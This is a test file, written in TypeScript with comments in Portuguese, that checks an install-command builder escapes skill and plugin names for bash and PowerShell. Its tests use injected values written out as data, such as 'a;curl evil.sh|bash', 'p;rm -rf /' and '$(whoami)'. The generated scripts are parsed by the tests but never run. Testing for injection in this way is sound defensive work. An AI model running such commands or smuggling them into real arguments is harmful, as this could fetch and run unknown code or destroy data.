// Executa o .ts via transpile do proprio Node (--experimental-strip-types em 22+).
import assert from "node:assert/strict";
import test from "node:test";
import { spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { buildInstallCommand, buildInstallScript } from "../lib/installCommand.ts";

test("quotes skill names in both shells", () => {
  const evil = ["a;curl evil.sh|bash"];

  const unix = buildInstallCommand({ skills: evil, tool: "all", os: "unix" });
  assert.match(unix, /--skills 'a;curl evil\.sh\|bash'/);

  const pwsh = buildInstallCommand({ skills: evil, tool: "all", os: "windows" });
  assert.match(pwsh, /-Skills @\('a;curl evil\.sh\|bash'\)/);
});

test("escapes embedded quotes per shell dialect", () => {
  assert.match(
    buildInstallCommand({ skills: ["it's"], tool: "all", os: "unix" }),
    /'it'\\''s'/,
  );
  assert.match(
    buildInstallCommand({ skills: ["it's"], tool: "all", os: "windows" }),
    /'it''s'/,
  );
});

test("adds the tool flag only when scoped, quoted like every other argument", () => {
  const scoped = buildInstallCommand({ skills: ["a"], tool: "claude", os: "unix" });
  const all = buildInstallCommand({ skills: ["a"], tool: "all", os: "unix" });
  assert.match(scoped, /--tools 'claude'/);
  assert.doesNotMatch(all, /--tools/);

  assert.match(
    buildInstallCommand({ skills: ["a"], tool: "claude", os: "windows" }),
    /-Tools 'claude'/,
  );
  assert.match(buildInstallScript(["a"], "claude", "windows").content, /-Tools 'claude'/);
});

test("truncates preview and reports the remainder", () => {
  const cmd = buildInstallCommand({
    skills: ["a", "b", "c", "d"],
    tool: "all",
    os: "unix",
    preview: 2,
  });
  assert.match(cmd, /'a','b',… \+2/);
});

test("appends quoted plugin installs, but never in preview", () => {
  const unix = buildInstallCommand({
    skills: ["a"],
    tool: "all",
    os: "unix",
    plugins: ["p;rm -rf /"],
  });
  assert.match(unix, /&& claude plugin install 'p;rm -rf \/'/);

  const pwsh = buildInstallCommand({
    skills: ["a"],
    tool: "all",
    os: "windows",
    plugins: ["p'x"],
  });
  assert.match(pwsh, /; claude plugin install 'p''x'/);

  const preview = buildInstallCommand({
    skills: ["a", "b", "c"],
    tool: "all",
    os: "unix",
    plugins: ["p"],
    preview: 2,
  });
  assert.doesNotMatch(preview, /plugin install/);
});

test("generates a runnable script per OS", () => {
  const sh = buildInstallScript(["a"], "all", "unix");
  assert.equal(sh.filename, "instalar-maleta.sh");
  assert.match(sh.content, /^#!\/usr\/bin\/env bash/);
  assert.match(sh.content, /set -euo pipefail/);

  const ps = buildInstallScript(["a"], "claude", "windows");
  assert.equal(ps.filename, "instalar-maleta.ps1");
  assert.match(ps.content, /\$ErrorActionPreference = 'Stop'/);
  assert.match(ps.content, /-Tools 'claude'/);
});

// --- Checagem de sintaxe real: os scripts sao PARSEADOS, nunca executados. ---

const HOSTILE_SKILLS = ["it's", "a;rm -rf /", "$(whoami)", "we`ird name", "x|y"];
const HOSTILE_PLUGINS = ["p'x", "a;rm -rf /", "$(id)", "pl ug|in"];

const hasBin = (bin, args) => {
  const r = spawnSync(bin, args, { encoding: "utf8" });
  return !r.error;
};

/** Escreve o script num tmpdir, entrega o caminho ao validador e limpa depois. */
function withScript(script, fn) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "maleta-test-"));
  const file = path.join(dir, script.filename);
  try {
    fs.writeFileSync(file, script.content);
    return fn(file);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
}

test("generated .sh parses under bash -n", (t) => {
  if (!hasBin("bash", ["-c", "exit 0"])) return t.skip("bash nao encontrado no PATH");

  const script = buildInstallScript(HOSTILE_SKILLS, "claude", "unix", HOSTILE_PLUGINS);
  withScript(script, (file) => {
    // -n = noexec: le e parseia, nao roda nada.
    const r = spawnSync("bash", ["-n", file.replace(/\\/g, "/")], { encoding: "utf8" });
    assert.equal(r.status, 0, `bash -n falhou:\n${r.stderr}\n--- script ---\n${script.content}`);
  });
});

test("generated .ps1 parses under the PowerShell parser", (t) => {
  if (!hasBin("powershell", ["-NoProfile", "-Command", "exit 0"])) {
    return t.skip("powershell nao encontrado no PATH");
  }

  const script = buildInstallScript(HOSTILE_SKILLS, "claude", "windows", HOSTILE_PLUGINS);
  withScript(script, (file) => {
    // ParseFile so constroi a AST; nada do script e executado.
    const probe =
      "$errs = $null; " +
      `[System.Management.Automation.Language.Parser]::ParseFile('${file}', [ref]$null, [ref]$errs); ` +
      "if ($errs.Count) { $errs | ForEach-Object { $_.Message }; exit 1 }";
    const r = spawnSync("powershell", ["-NoProfile", "-Command", probe], { encoding: "utf8" });
    assert.equal(
      r.status,
      0,
      `ParseFile falhou:\n${r.stdout}${r.stderr}\n--- script ---\n${script.content}`,
    );
  });
});
